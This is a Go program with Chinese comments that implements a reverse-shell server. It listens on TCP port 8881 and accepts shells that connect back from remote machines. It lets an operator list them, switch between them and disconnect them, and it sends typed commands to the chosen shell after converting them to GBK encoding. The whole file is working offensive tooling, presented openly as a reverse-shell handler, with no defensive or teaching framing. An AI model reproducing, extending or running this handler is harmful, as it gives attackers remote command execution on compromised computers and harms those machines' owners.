package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

type ConnectionManager struct {
	connections     []*net.Conn
	currentConn     int
	connectionMutex sync.Mutex
}

func main() {
	listener, err := net.Listen("tcp", "0.0.0.0:8881")
	if err != nil {
		fmt.Println("无法启动服务器:", err)
		return
	}
	defer listener.Close()

	fmt.Println("反弹shell服务器已启动，等待连接...")

	manager := &ConnectionManager{
		connections: make([]*net.Conn, 0),
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("接受连接时出错:", err)
			continue
		}

		fmt.Println("已连接到反弹shell")
		manager.AddConnection(&conn)
		go manager.handleConnection(&conn)
	}
}

func (m *ConnectionManager) AddConnection(conn *net.Conn) {
	m.connectionMutex.Lock()
	defer m.connectionMutex.Unlock()
	m.connections = append(m.connections, conn)
}

func (m *ConnectionManager) RemoveConnection(index int) {
	m.connectionMutex.Lock()
	defer m.connectionMutex.Unlock()

	if index >= 0 && index < len(m.connections) {
		(*m.connections[index]).Close()
		copy(m.connections[index:], m.connections[index+1:])
		m.connections = m.connections[:len(m.connections)-1]
	}
}

func (m *ConnectionManager) handleConnection(conn *net.Conn) {
	m.connectionMutex.Lock()
	m.currentConn = len(m.connections) - 1
	m.connectionMutex.Unlock()

	defer func() {
		m.RemoveConnection(m.currentConn)
		(*conn).Close()
	}()

	outputChan := make(chan string)
	go m.handleOutput(*conn, outputChan)

	m.handleInput(*conn, outputChan)
}

func (m *ConnectionManager) handleOutput(conn net.Conn, outputChan chan<- string) {
	scanner := bufio.NewScanner(transform.NewReader(conn, simplifiedchinese.GBK.NewDecoder()))
	for scanner.Scan() {
		output := scanner.Text()
		//fmt.Println("Shell输出:", output) // 立即显示输出结果
		outputChan <- output // 将输出发送到输出通道
	}
	close(outputChan) // 当输出循环结束时关闭通道
}

func (m *ConnectionManager) handleInput(conn net.Conn, outputChan <-chan string) {
	scanner := bufio.NewScanner(os.Stdin)
	outputCache := make([]string, 0) // 输出结果缓存
	outputDone := make(chan struct{})

	// 单独的 goroutine 用于监听输出通道
	go func() {
		for output := range outputChan {
			fmt.Println("Shell输出:", output)
		}
		close(outputDone) // 输出通道关闭时发送信号
	}()

	for {
		fmt.Println("当前连接信息：")
		m.DisplayConnections()
		fmt.Print("请输入指令或使用'switch INDEX'切换连接或'disconnect INDEX'断开连接: \n")

		select {
		case <-outputDone: // 等待输出通道关闭信号
			// 显示缓存的输出结果
			m.showOutputCache(outputCache)
			outputCache = make([]string, 0)
		default:
			if scanner.Scan() {
				input := scanner.Text()

				if strings.HasPrefix(input, "switch ") {
					indexStr := strings.TrimSpace(strings.TrimPrefix(input, "switch "))
					index, err := strconv.Atoi(indexStr)
					if err != nil || index < 0 || index >= len(m.connections) {
						fmt.Println("无效的连接索引:", indexStr)
						continue
					}

					fmt.Println("已切换连接到索引:", index)
					m.connectionMutex.Lock()
					m.currentConn = index
					m.connectionMutex.Unlock()

					// 显示缓存的输出结果
					m.showOutputCache(outputCache)
					outputCache = make([]string, 0)
					continue
				}

				if strings.HasPrefix(input, "disconnect ") {
					indexStr := strings.TrimSpace(strings.TrimPrefix(input, "disconnect "))
					index, err := strconv.Atoi(indexStr)
					if err != nil || index < 0 || index >= len(m.connections) {
						fmt.Println("无效的连接索引:", indexStr)
						continue
					}

					fmt.Println("正在断开连接:", index)
					m.RemoveConnection(index)
					continue
				}

				if strings.ToLower(input) == "exit" {
					fmt.Println("与反弹shell的连接将断开")
					break
				}

				// 将UTF-8编码的指令转换为GBK编码后发送给shell
				gbkEncoder := simplifiedchinese.GBK.NewEncoder()
				inputGBK, _, _ := transform.String(gbkEncoder, input)
				m.connectionMutex.Lock()
				if m.currentConn >= 0 && m.currentConn < len(m.connections) {
					(*m.connections[m.currentConn]).Write([]byte(inputGBK + "\n"))
				} else {
					fmt.Println("当前没有活动连接")
				}
				m.connectionMutex.Unlock()
			}
		}
	}
}

func (m *ConnectionManager) showOutputCache(outputCache []string) {
	for _, output := range outputCache {
		fmt.Println("Shell输出:", output)
	}
}

func (m *ConnectionManager) DisplayConnections() {
	m.connectionMutex.Lock()
	defer m.connectionMutex.Unlock()
	for i, conn := range m.connections {
		fmt.Printf("连接 %d -> %s\n", i, (*conn).RemoteAddr())
	}
}
